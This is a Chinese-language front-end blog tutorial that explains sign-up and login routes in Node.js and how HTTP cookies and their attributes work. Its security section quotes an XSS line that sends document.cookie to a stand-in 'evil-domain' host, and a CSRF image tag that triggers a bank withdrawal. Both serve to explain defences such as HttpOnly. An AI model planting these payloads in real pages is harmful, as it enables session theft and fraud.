<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>HTTP系列 -- 注册登录 + Cookie | 吴博文</title>
  <meta name="author" content="吴博文">
  
  <meta name="description" content="概述我们每天在使用电脑的时候都会去注册或者登录，作为前端是必须要了解其中的过程的。
注册后端后端需要一个路由，当用户请求注册界面时，后端要去读取注册界面，之后发给前端，并且还要设置 method

GET ==&amp;gt; 请求注册页面
 1234567else if( path === &amp;apos;/">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="HTTP系列 -- 注册登录 + Cookie"/>
  <meta property="og:site_name" content="吴博文"/>

  
    <meta property="og:image" content=""/>
  
  
  <link href="/favicon.ico" rel="icon" type="image/x-ico">
  <link rel="canonical" href="http://yoursite.com/2018/02/07/HTTP系列 -- 注册登录 + Cookie/index.html" />
  <link rel="alternate" href="/atom.xml" title="吴博文" type="application/atom+xml">
  
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-45991394-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>

</head>


<body>
  <header id="header" class="inner"><div class="blog-header">
  <h1><a href="/">吴博文</a></h1>
  <h2><a href="/"></a></h2>
</div>
<nav id="main-nav" class="blog-nav">
  <ul>
    
      <li><a href="/">首页/Home</a></li>
    
      <li><a href="/archives">归档/Archives</a></li>
    
      <li><a href="/about">关于/About</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div>
</header>
  <div id="content" class="inner">
    
      <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-07T11:13:20.000Z"><a href="/2018/02/07/HTTP系列 -- 注册登录 + Cookie/">2018-02-07</a></time>
      
      
  
    <h1 class="title">HTTP系列 -- 注册登录 + Cookie</h1>
  

    </header>
    <div class="entry">
      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>我们每天在使用电脑的时候都会去注册或者登录，作为前端是必须要了解其中的过程的。</p>
<h1 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h1><h3 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h3><p>后端需要一个路由，当用户请求注册界面时，后端要去读取注册界面，之后发给前端，并且还要设置 <code>method</code></p>
<ul>
<li><p><code>GET</code> ==&gt; 请求注册页面</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">else if( path === &apos;/sign_up&apos; &amp;&amp; method === &apos;GET&apos;)&#123;</span><br><span class="line">    let string = fs.readFileSync( &apos;./sign_up.html&apos;, &apos;utf-8&apos; )</span><br><span class="line">    response.setHeader( &apos;Content-Type&apos;, &apos;text/html;charset=utf-8&apos; )</span><br><span class="line">    response.statusCode = 200</span><br><span class="line">    response.write( string )</span><br><span class="line">    response.end()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>POST</code> ==&gt; 用户注册发送数据（使用表单 | AJAX）</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">else if( path === &apos;/sign_up&apos; &amp;&amp; method === &apos;POST&apos; )&#123;</span><br><span class="line">    // 拿到前端 POST 的数据，之后进行处理，拿到后端想要的结构</span><br><span class="line">    readBody( request ).then( () =&gt; &#123;&#125;, () =&gt; &#123;&#125; )</span><br><span class="line">    // 后端进行验证</span><br><span class="line">    // 1. 验证用户输入是否合格</span><br><span class="line">    // 2. 验证用户名是否占用 | 邮箱是否占用（都是去和自己的数据库进行比较）</span><br><span class="line">    // 3. 验证失败 ==&gt; 以 JSON 格式传输给前端错误,400</span><br><span class="line">    // 4. 验证成功 ==&gt; 存储数据库，200</span><br><span class="line">&#125;</span><br><span class="line">function readBody( request )&#123;</span><br><span class="line">    return new Promise( ( resolve, reject ) =&gt; &#123;</span><br><span class="line">        let body = []</span><br><span class="line">        request.on( &apos;data&apos;, ( chunk ) =&gt; &#123;</span><br><span class="line">            body.push( chunk )</span><br><span class="line">        &#125;).on( &apos;end&apos;, () =&gt; &#123;</span><br><span class="line">            body = Buffer.concat( body ).toString()</span><br><span class="line">            resolve( body )</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><h5 id="跳转注册界面"><a href="#跳转注册界面" class="headerlink" title="跳转注册界面"></a>跳转注册界面</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&apos;/sign_up.html&apos;&gt;</span><br></pre></td></tr></table></figure>
<h5 id="提交用户输入数据"><a href="#提交用户输入数据" class="headerlink" title="提交用户输入数据"></a>提交用户输入数据</h5><ol>
<li>拿到用户输入，可以监听 <code>form</code> 的 <code>submit</code> 事件</li>
<li>前端验证<ul>
<li>验证成功 ==&gt; 下一步</li>
<li>验证失败 ==&gt; 提示用户</li>
</ul>
</li>
<li>发送请求（数据是第四部分 formdata）<ul>
<li><code>form</code> 的 <code>submit</code></li>
<li><code>$post()</code></li>
</ul>
</li>
<li>成功（打印 response） ==&gt; 200 + 渲染页面</li>
<li>失败（打印 response） ==&gt; JSON 格式的字符串 + 解析 + 提示用户</li>
</ol>
<h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><h3 id="后端-1"><a href="#后端-1" class="headerlink" title="后端"></a>后端</h3><p>后端需要一个路由，当用户请求登录界面时，后端要去读取登录界面，之后发给前端，并且还要设置 method</p>
<ul>
<li><p><code>GET</code> ==&gt; 请求注册页面</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">else if( path === &apos;/sign_in&apos; &amp;&amp; method === &apos;GET&apos;)&#123;</span><br><span class="line">    let string = fs.readFileSync( &apos;./sign_in.html&apos;, &apos;utf-8&apos; )</span><br><span class="line">    response.setHeader( &apos;Content-Type&apos;, &apos;text/html;charset=utf-8&apos; )</span><br><span class="line">    response.statusCode = 200</span><br><span class="line">    response.write( string )</span><br><span class="line">    response.end()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>POST</code> ==&gt; 用户登录发送数据（使用表单 | AJAX）</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">else if(path===&apos;/sign_in&apos; &amp;&amp; method === &apos;POST&apos;)&#123;</span><br><span class="line">    // 拿到前端 POST 的数据，之后进行处理，拿到后端想要的结构</span><br><span class="line">     readBody( request ).then( () =&gt; &#123;&#125;, () =&gt; &#123;&#125; )</span><br><span class="line">    // 后端进行数据库比对</span><br><span class="line">    // 1. 比对用户是否存在</span><br><span class="line">    // 2. 比对用户输入密码是否正确</span><br><span class="line">    // 3. 比对失败 ==&gt; 以 JSON 格式传输给前端错误,400</span><br><span class="line">    // 4. 比对成功 ==&gt; 设置 Cookie ，200</span><br><span class="line">    response.setHeader( &apos;Set-Cookie&apos;,  &apos;xxx&apos; ) // xxx 就是一个身份证</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="前端-1"><a href="#前端-1" class="headerlink" title="前端"></a>前端</h3><h5 id="跳转登录界面"><a href="#跳转登录界面" class="headerlink" title="跳转登录界面"></a>跳转登录界面</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&apos;/sign_in.html&apos;&gt;</span><br></pre></td></tr></table></figure>
<h5 id="提交用户输入数据-1"><a href="#提交用户输入数据-1" class="headerlink" title="提交用户输入数据"></a>提交用户输入数据</h5><ol>
<li>拿到用户输入，可以监听 <code>form</code> 的 <code>submit</code> 事件</li>
<li>前端验证<ul>
<li>验证成功 ==&gt; 下一步</li>
<li>验证失败 ==&gt; 提示用户</li>
</ul>
</li>
<li>发送请求（数据是第四部分 formdata）<ul>
<li><code>form</code> 的 <code>submit</code></li>
<li><code>$post()</code></li>
</ul>
</li>
<li>成功（打印 response） ==&gt; 200 + 渲染页面</li>
<li>失败（打印 response） ==&gt; JSON 格式的字符串 + 解析 + 提示用户</li>
</ol>
<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>服务器发送到用户浏览器并保存在用户本地的一小块数据，它会在浏览器下次向同一服务器再次发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。<strong>Cookie使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能</strong></p>
<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>Cookie 主要用于以下三个方面</p>
<ol>
<li>会话状态管理（如用户登录状态、购物车、游戏分数或其他需要记录的信息）</li>
<li>个性化设置（如用户自定义设置、主题等）</li>
<li>浏览器跟踪行为（如跟踪用户行为等）</li>
</ol>
<h3 id="前端设置-Cookie"><a href="#前端设置-Cookie" class="headerlink" title="前端设置 Cookie"></a>前端设置 Cookie</h3><p>通过 <code>document.cookie</code> API 可以获取或设置当前文档相关联的 Cookie</p>
<h5 id="读取-Cookie"><a href="#读取-Cookie" class="headerlink" title="读取 Cookie"></a>读取 Cookie</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let  allCookie = document.cookie</span><br></pre></td></tr></table></figure>
<h5 id="设置（写一个新的）Cookie"><a href="#设置（写一个新的）Cookie" class="headerlink" title="设置（写一个新的）Cookie"></a>设置（写一个新的）Cookie</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = newCookie</span><br></pre></td></tr></table></figure>
<p><code>newCookie</code> 是一个键值对形式的字符串，使用这个方法一次只能对一个<br> Cookie 进行设置或更新。以下可选 Cookie 属性值可以跟在键值对后，用来具体化对 Cookie 的设置或更新，使用分号进行分隔</p>
<ul>
<li><p><code>;path = path</code> ==&gt; 如果没有定义，默认为当前文档位置的路径</p>
</li>
<li><p><code>;domain = domain</code> ==&gt; 如果没有定义，默认为当前文档位置的路径的域名部分</p>
</li>
<li><p><code>;max-age = max-age-in-seconds</code> ==&gt; 过期时长</p>
</li>
<li><p><code>;expires = date-in-GMTString-format</code> ==&gt; 如果没有定义，Cookie 会在会话结束时过期</p>
</li>
<li><p><code>;secure</code> ==&gt; Cookie 只能通过 HTTPS 传输</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = &quot;someCookieName=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/&quot;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="后端-code"><a href="#后端-code" class="headerlink" title="后端 + code"></a>后端 + code</h3><p>后端验证成功（200）时会设置一个 Cookie 响应头<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader(&apos;Set-Cookie&apos;, &apos;xxx&apos; ) // xxx 就是一个身份证</span><br></pre></td></tr></table></figure></p>
<p>设置 Cookie 之后的同源请求都会带着 Cookie</p>
<h5 id="会话期-Cookie"><a href="#会话期-Cookie" class="headerlink" title="会话期 Cookie"></a>会话期 Cookie</h5><p>浏览器关闭后会自动删除，它仅在会话期有效。会话期 Cookie 不需要指定过期时间（Expirse）或者有效期（Max-Age）</p>
<h5 id="持久性-Cookie"><a href="#持久性-Cookie" class="headerlink" title="持久性 Cookie"></a>持久性 Cookie</h5><p>持久性 Cookie 可以指定一个特定的过期时间（Expirse）或有效期（Max-Age）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader( &apos;Set-Cookie&apos;, &apos;id = xxx; Expirse = 时间点（Max-Age = 时长）&apos; )</span><br></pre></td></tr></table></figure></p>
<h5 id="secure-标记"><a href="#secure-标记" class="headerlink" title="secure 标记"></a>secure 标记</h5><p>安全的 Cookie 只应通过 HTTPS 协议加密过的请求发送给服务端，设置 secure 标记的 Cookie 只在 HTTPS 中生效</p>
<h5 id="HttpOnly-标记"><a href="#HttpOnly-标记" class="headerlink" title="HttpOnly 标记"></a>HttpOnly 标记</h5><p>由于 Cookie 可以通过 JS 的 <code>document.cookie</code> 进行修改，但是通过 JS 的 <code>document.cookie</code> 无法访问带有 HttpOnly 标记的 Cookie，所以包含服务端 Session 信息的 Cookie 不想被浏览器的 JS 脚本调用，设置 HttpOnly 标记即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader( &apos;Set-Cookie&apos;, &apos;id = a3fWa; Expires = GMT时间格式; Secure; HttpOnly&apos; )</span><br></pre></td></tr></table></figure></p>
<h5 id="Cookie-作用域"><a href="#Cookie-作用域" class="headerlink" title="Cookie 作用域"></a>Cookie 作用域</h5><p><code>Domain</code> + <code>Path</code> 标识定义了 Cookie 的作用域，即 Cookie 应该发送给那些 URL</p>
<ul>
<li><p><code>Domain</code> ==&gt; 制定哪些主机可以接收 Cookie，如果不指定，不包含子域名，如果指定了 <code>Domain</code> 则一般包含子域名。例如，如果设置 <code>Domain = mozilla.org</code>，则 Cookie 也包含在子域名中（如 <code>developer.mozilla.org</code>）</p>
</li>
<li><p><code>Path</code> ==&gt; 制定了主机下哪些路径可以接收 Cookie（该 URL 路径必须存在于请求 URL 中）。例如，设置 <code>Path = /docs</code>，那么以下路径都会匹配 <code>/docs</code> | <code>/docs/web</code> | <code>/docs/web/http</code></p>
</li>
</ul>
<h5 id="SameSite-Cookie"><a href="#SameSite-Cookie" class="headerlink" title="SameSite Cookie"></a>SameSite Cookie</h5><p>SameSite Cookie 允许服务器指定在跨站请求时该 Cookie 是否会被发送，从而可以阻止跨站请求伪造攻击（CSRF）</p>
<h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><h5 id="会话挟持和-XSS"><a href="#会话挟持和-XSS" class="headerlink" title="会话挟持和 XSS"></a>会话挟持和 XSS</h5><p>在 web 应用中，Cookie 常用来标记用户或授权会话，因此如果 web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 XSS 攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</span><br></pre></td></tr></table></figure></p>
<p><code>HttpOnly</code> 类型的 Cookie 由于阻止了 JS 对 Cookie 的操作而能在一定程度上缓解此类攻击</p>
<h5 id="CSRF（跨域请求伪造）"><a href="#CSRF（跨域请求伪造）" class="headerlink" title="CSRF（跨域请求伪造）"></a>CSRF（跨域请求伪造）</h5><p>如果在不安全的聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>当打开含有这张图片的 HTML 页面时，如果之前登录了银行账号并且 Cookie 仍然有效（还没有其他验证步骤），银行中的钱会被自动转走。</p>
<h6 id="阻止-CSRF"><a href="#阻止-CSRF" class="headerlink" title="阻止 CSRF"></a>阻止 CSRF</h6><ol>
<li>对用户输入进行过滤来阻止 XSS</li>
<li>任何敏感操作都需要确认</li>
<li>用于敏感信息的 Cookie 只能拥有较短的生命周期</li>
</ol>
<h3 id="Cookie-特点"><a href="#Cookie-特点" class="headerlink" title="Cookie 特点"></a>Cookie 特点</h3><ol>
<li>Cookie 储存用户信息</li>
<li>服务器通过 <code>Set-Cookie</code> 响应头设置 Cookie </li>
<li>浏览器得到 Cookie 后，每次请求相同域名都要带上 Cookie </li>
<li>服务器通过 Cookie 得知是哪个用户（<code>request.headers.cookie</code> // 读取 Cookie ）</li>
<li>Cookie 存储在本地的一个文件中</li>
<li>Cookie 不安全，用户可以通过开发者工具 Application/Cookie 可以进行修改，或者 JS 的 <code>document.cookie</code> 进行修改</li>
<li>每个浏览器的 Cookie 不同</li>
<li>Cookie 有时效性</li>
<li>后端可以强制设置 Cookie 有效期</li>
<li>Cookie 按域名划分。一个网站只会带着自己域名的 Cookie ，不会带着其他域的 Cookie </li>
</ol>
<h5 id="Cookie-说明"><a href="#Cookie-说明" class="headerlink" title="Cookie 说明"></a>Cookie 说明</h5><p>Cookie 大小受限，每次请求新的页面 Cookie 都会被发送过去。Cookie 不能跨域调用。Cookie 的作用是与服务器进行交互，Cookie 作为 HTTP 规范的一部分存在 </p>
<h5 id="删除-Cookie"><a href="#删除-Cookie" class="headerlink" title="删除 Cookie"></a>删除 Cookie</h5><ul>
<li>服务器端可以通过设置 Expires、max-age 两个标签将 Cookie 设置为过期状态</li>
<li>JavaScript 可以通过document.cookie API 删除 Cookie</li>
</ul>
<h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><ol>
<li><p><code>formdata</code> 是一段一段上传的，上传时会触发 <code>data</code> 事件（node http get post data）</p>
</li>
<li><p>前端是不安全的，所以前端可以不进行验证，但是后端必须进行验证。用户可以通过 <code>curl</code> 发送请求，这样就越过了前端 JS</p>
</li>
<li><p><code>decodeURIComponent()</code><br>用于解码由 <code>encodeURIComponent()</code> 方法或其他类似方法编码的部分 URI（统一资源标识符）</p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie" target="_blank" rel="noopener"><code>Set-Cookie</code></a></p>
</li>
<li><p>CSRF（跨域请求伪造） 是指一种挟持受信任用户向服务器发送非预期请求的攻击方式。例如，这些非预期请求可能在 URL 后加入一些恶意的参数，从而达到攻击者的目的</p>
</li>
<li><p>XSS（Cross-site scripting）是一种安全漏洞，攻击者利用这种漏洞在网上注入恶意的客户端代码。当被攻击者登录网站时就会自动运行这些恶意代码，从而攻击者可以突破网站的访问权限，冒充受害者。</p>
<ul>
<li>如果 Web 应用程序没有部署足够的安全验证，那么这些脚本可以任意读取 Cookie或者其他敏感的网站信息，或者让恶意脚本重写 HTML 内容</li>
<li>以下两种情况最容易发生 XSS 攻击<ol>
<li>数据从一个不可靠的链接进入一个 Web 应用程序</li>
<li>没有过滤掉恶意代码的动态内容被发送给 Web 用户</li>
</ol>
</li>
<li>XSS 攻击类型<ol>
<li><strong>存储型（持久型）</strong>：注入型脚本永久存储在目标服务器上，当浏览器请求数据时，脚本从服务器上传回并执行</li>
<li><strong>反射型（非持久型）</strong>：当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站，Web 服务器将注入脚本，比如一个错误信息、搜索结果等返回到用户浏览器上，浏览器会执行这个脚本，因为，浏览器认为这个响应来自可信任的服务器</li>
<li>基于 DOM 的 XSS：被执行的恶意脚本会修改页面脚本结构</li>
</ol>
</li>
</ul>
</li>
</ol>

      
    </div>
    <footer>
      
        
        
          <script src="https://utteranc.es/client.js"
            repo="winterland1989/winterland1989.github.io"
            branch="master"
            issue-term="pathname"
            async>
          </script>
        
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>
</div></div>
      <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="Suche">
    <input type="hidden" name="q" value="site:yoursite.com">
  </form>
</div>

  
<div class="widget tag">
  <h3 class="title">Tags</h3>
  <ul class="entry">
  
    <li><a href="/tags/CSS/">CSS</a><small>10</small></li>
  
    <li><a href="/tags/HTML/">HTML</a><small>1</small></li>
  
    <li><a href="/tags/HTTP/">HTTP</a><small>9</small></li>
  
    <li><a href="/tags/JavaScript/">JavaScript</a><small>11</small></li>
  
    <li><a href="/tags/JavaScript-进阶/">JavaScript 进阶</a><small>2</small></li>
  
    <li><a href="/tags/Plugin/">Plugin</a><small>1</small></li>
  
    <li><a href="/tags/jQuery/">jQuery</a><small>4</small></li>
  
    <li><a href="/tags/前端基础/">前端基础</a><small>3</small></li>
  
    <li><a href="/tags/博客/">博客</a><small>6</small></li>
  
    <li><a href="/tags/总结/">总结</a><small>2</small></li>
  
  </ul>
</div>


</aside>
    
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="aligncenter">
  
  &copy; 2018 吴博文
  
</div>
<div class="clearfix"></div></footer>
  <script src="http://cdn.staticfile.org/jquery/2.1.1-rc2/jquery.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>



<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>
<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script src="https://www.zybuluo.com/static/MathJax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</script>


  
    <!-- Go to www.addthis.com/dashboard to customize your tools -->
    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-59a3e3079f1b7ad5"></script> 
  

</body>
</html>
